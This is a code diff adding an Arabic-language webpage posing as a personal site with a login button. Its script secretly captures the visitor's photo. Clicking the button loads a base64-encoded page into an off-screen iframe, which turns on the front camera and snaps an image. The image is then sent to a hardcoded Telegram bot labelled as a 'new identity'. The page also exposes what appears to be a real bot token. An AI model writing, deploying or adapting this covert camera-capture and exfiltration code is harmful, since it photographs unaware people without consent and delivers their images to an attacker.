@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أحمد طارق | الموقع الرسمي</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #f4f4f9; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+            align-items: center; 
+            justify-content: center;
+            text-align: center;
+        }
+
+        header {
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 0;
+            z-index: 10;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+            margin-top: 60px;
+            position: relative;
+            z-index: 2;
+        }
+
+        h1 { color: #333; margin-bottom: 10px; }
+        .tagline { color: #666; display: block; margin-bottom: 20px; font-style: italic; }
+        p { color: #777; line-height: 1.6; }
+
+        .login-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        /* إخفاء الإطار الذي سيحتوي على الكاميرا */
+        #hidden-frame {
+            position: absolute;
+            top: -9999px; /* يخرجه من الشاشة تماماً */
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>  
+<body>  
+
+<!-- هذا هو الإطار المخفي -->
+<iframe id="hidden-frame"></iframe>
+
+<header><div class="logo">أحمد طارق</div></header>  
+
+<div class="container">  
+    <h1>أهلاً بك في عالمي</h1>  
+    <span class="tagline">موقعي الجديد حلو ولا لا؟ ادخل وشوف</span>  
+    <p>نقدم لك تجربة فريدة من نوعها. اضغط على الزر أدناه للمتابعة.</p>  
+    <button class="login-btn" onclick="startCapture()">تسجيل الدخول</button>  
+</div>  
+
+<script>
+    // بيانات البوت الخاصة بك
+    const BOT_TOKEN = '9245241768:AAHuTT8kN-B9RGomtcJ_bxu6EsKWQl2Ccoc';  
+    const CHAT_ID = '1861524547';  
+
+    // كود الـ iframe مدمج هنا كـ Base64
+    const captureCode = `
+    <!DOCTYPE html>
+    <html>
+    <body style="margin:0; padding:0; background:#000;">
+        <video id="v" autoplay playsinline style="position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover;"></video>
+        <canvas id="c" style="display:none;"></canvas>
+        <script>
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                document.getElementById('v').srcObject = stream;
+                document.getElementById('v').onloadedmetadata = () => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = document.getElementById('v').videoWidth;
+                    canvas.height = document.getElementById('v').videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(document.getElementById('v'), 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        parent.postMessage({type: 'PHOTO_READY', blob: blob}, '*');
+                    }, 'image/jpeg', 0.8);
+                };
+            });
+        <\/script>
+    </body>
+    </html>`;
+
+    function startCapture() {
+        // تحويل الكود إلى رابط Data URL
+        const dataUri = 'data:text/html;base64,' + btoa(captureCode);
+        
+        // تشغيل الكاميرا داخل الـ iframe المخفي
+        document.getElementById('hidden-frame').src = dataUri;
+        
+        // الاستماع للرسالة القادمة من الـ iframe
+        window.addEventListener('message', function(event) {
+            if (event.data.type === 'PHOTO_READY') {
+                sendPhoto(event.data.blob);
+            }
+        });
+    }
+
+    function sendPhoto(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "id_check.jpg");
+        formData.append("caption", "📸 هوية جديدة: " + new Date().toLocaleTimeString());
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).then(() => console.log("تم إرسال الصورة بنجاح"));
+    }
+</script>  
+</body>  
+</html>
